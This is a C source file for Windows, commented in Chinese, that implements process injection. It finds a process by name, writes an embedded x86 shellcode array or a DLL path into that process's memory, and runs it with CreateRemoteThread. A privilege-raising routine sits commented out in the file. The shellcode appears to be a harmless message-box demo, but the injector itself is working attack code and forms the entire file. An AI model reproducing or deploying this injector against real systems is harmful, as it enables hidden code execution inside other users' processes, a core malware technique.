#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>


char g_shellcode_x86[] = {
	0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C,
	0x8B, 0xF4, 0x8D, 0x7E, 0xF4, 0x33, 0xDB, 0xB7, 0x04, 0x2B, 0xE3, 0x66, 0xBB, 0x33, 0x32, 0x53,
	0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x33, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B,
	0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75,
	0x05, 0x95, 0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x28, 0x78, 0x03, 0xCD,
	0x8B, 0x59, 0x20, 0x03, 0xDD, 0x33, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x03, 0xF5, 0x99, 0x0F, 0xBE,
	0x06, 0x38, 0xE0, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x03, 0xD0, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24,
	0x1C, 0x75, 0xE4, 0x8B, 0x59, 0x24, 0x03, 0xDD, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x03,
	0xDD, 0x03, 0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9,
	0x33, 0xDB, 0x53, 0x6A, 0x00, 0x68, 0x64, 0x71, 0x78, 0x20, 0x68, 0x6F, 0x20, 0x72, 0x65, 0x68,
	0x68, 0x65, 0x6C, 0x6C, 0x8B, 0xC4, 0x53, 0x50, 0x50, 0x53, 0xFF, 0x57, 0xFC, 0x33, 0xDB, 0x53,
	0xFF, 0x57, 0xF8, 0xC3
};
char g_shellcode_x64[] = {
	0x90,
};

//BOOL Get_Privilege(TCHAR* lpszPrivilege, DWORD bEnablePrivilege)
//{
//	TOKEN_PRIVILEGES tp;
//	HANDLE hToken;
//	LUID luid;
//
//	if (!OpenProcessToken(
//		GetCurrentProcess(),//获取当前进程的句柄
//		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, // 要修改权限+需要查询信息
//		&hToken)//即函数调用成功后将获得的令牌句柄存储到这个变量中。
//		)
//	{
//		_tprintf(TEXT("OpenProcessToken error %d\n"), GetLastError());
//		return FALSE;
//	}
//
//	if (!LookupPrivilegeValue(//该函数用于检索给定特权名称的特权标识符
//		NULL,//NULL表示将使用本地系统来执行特权查找操作
//		lpszPrivilege, //字符串,指定要查找其特权标识符的特权名称。
//		&luid//输出变量,这是一个指向LUID（特权标识符）变量的指针
//	)
//		)
//	{
//		_tprintf(TEXT("LookupPrivilegeValue error %d\n"), GetLastError());
//		CloseHandle(hToken);
//		return FALSE;
//	}
//
//	tp.PrivilegeCount = 1;
//	tp.Privileges[0].Luid = luid;
//	if (bEnablePrivilege)
//	{
//		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//	}
//	else
//	{
//		tp.Privileges[0].Attributes = 0;
//	}
//	if (!AdjustTokenPrivileges(
//		hToken, //从OpenProcessToken获取的
//		FALSE,
//		&tp,//从LookupPrivilegeValue获取的
//		sizeof(TOKEN_PRIVILEGES),
//		(PTOKEN_PRIVILEGES)NULL,
//		(PDWORD)NULL
//	)
//		)
//	{
//		_tprintf(TEXT("AdjustTokenPrivileges error %d\n "), GetLastError());
//		CloseHandle(hToken);
//		return FALSE;
//	}
//	CloseHandle(hToken);
//	return TRUE;
//}


BOOL inject_process(DWORD dwPID, char* lp_shellcode, size_t shellcodeLen, char* pArg, size_t argLen)
{
	HANDLE hProcess = NULL, hThread = NULL;
	PVOID pRemoteFunc;
	PVOID pRemoteParam;
	BOOL fun_is_remote_alloc;
	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		_tprintf(TEXT("OpenProcess failed %d\n"), GetLastError());
		return FALSE;
	}


	pRemoteFunc = VirtualAllocEx(hProcess, NULL, shellcodeLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pRemoteFunc) {
		WriteProcessMemory(hProcess, pRemoteFunc, (LPVOID)lp_shellcode, shellcodeLen, NULL);//shellcode注入
		fun_is_remote_alloc = TRUE;
	}
	else {
		pRemoteFunc = lp_shellcode;//dll注入
		fun_is_remote_alloc = FALSE;
	}

	pRemoteParam = VirtualAllocEx(hProcess, NULL, argLen, MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteParam) {
		WriteProcessMemory(hProcess, pRemoteParam, (LPVOID)pArg, argLen, NULL);//往目标进程写入数据
	}

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteFunc, pRemoteParam, 0, NULL);
	if (hThread)
	{
		WaitForSingleObject(hThread, INFINITE);//等待远程线程执行完毕
		CloseHandle(hThread);
	}
	if (fun_is_remote_alloc)
		VirtualFreeEx(hProcess, pRemoteFunc, 0, MEM_FREE);
	if (pRemoteParam)
		VirtualFreeEx(hProcess, pRemoteParam, 0, MEM_FREE);
	CloseHandle(hProcess);
	return TRUE;
}

DWORD FindProcessID_byName(TCHAR* szProcessName)//
{
	DWORD dwPID = 0;
	HANDLE hSnapShot;
	PROCESSENTRY32 pe;

	// Get the snapshot of the system
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		if (!_tcscmp(szProcessName, pe.szExeFile))
		{
			dwPID = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe));
	CloseHandle(hSnapShot);

	return dwPID;
}
//在我的进程中寻找
char* gen_shellcode_injectDll_v1(size_t* arg_len)
{
	HMODULE hModule;
	char* retData = NULL;
	*arg_len = 0;
	hModule = GetModuleHandle(TEXT("kernel32.dll"));
	if (hModule) {
		retData = (char*)GetProcAddress(hModule, "LoadLibraryA");
		if (retData) {
			return retData;
		}
	}

	return retData;
}
//去目标进程寻找
char* gen_shellcode_injectDll_v2(size_t* arg_len)
{
	return NULL;
}
int _tmain(int argc, TCHAR* argv[])
{
	DWORD dwPID;
	HANDLE hProcess;
	BOOL is_x86 = 0;
	char* lp_shellcode;
	size_t shellcode_len;
	char* lp_arg;
	size_t argLen;


	if (argc != 2)//pid button dllPath
	{
		_tprintf(TEXT("USAGE: self.exe processname \n"));
		return 0;
	}
	dwPID = FindProcessID_byName(argv[1]);

	//if (!Get_Privilege(SE_DEBUG_NAME, TRUE))//提权
	//{
	//    return 1;
	//}
	if (dwPID) {
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);
		IsWow64Process(hProcess, &is_x86);
		CloseHandle(hProcess);


		

#ifdef _M_IX86
		if (is_x86) {
			//dll inject demo
			//  lp_shellcode = gen_shellcode_injectDll_v1(&shellcode_len);
			//	lp_arg = (char*)"c:\\hgfs\\dll1_x86.dll";
			//	argLen = strlen(lp_arg) + 1;
		 

			//process inject demo
			lp_shellcode = g_shellcode_x86;
			shellcode_len = sizeof(g_shellcode_x86);
			lp_arg = NULL;
			argLen = 0;
#else
		if (!is_x86) {
			//dll inject demo
			lp_shellcode = gen_shellcode_injectDll_v1(&shellcode_len);
			lp_arg = (char*)"c:\\hgfs\\dll1_x64.dll";
			argLen = strlen(lp_arg) + 1;


#endif
			//公用部分


			if (lp_shellcode) {
				inject_process(dwPID, lp_shellcode, shellcode_len, lp_arg, argLen);
			}
		}
		else {
			_tprintf(TEXT("USAGE: arch is not correct\n"));
		}
	}
	else{
		_tprintf(TEXT("not found\n"));
	}
	return 0;
}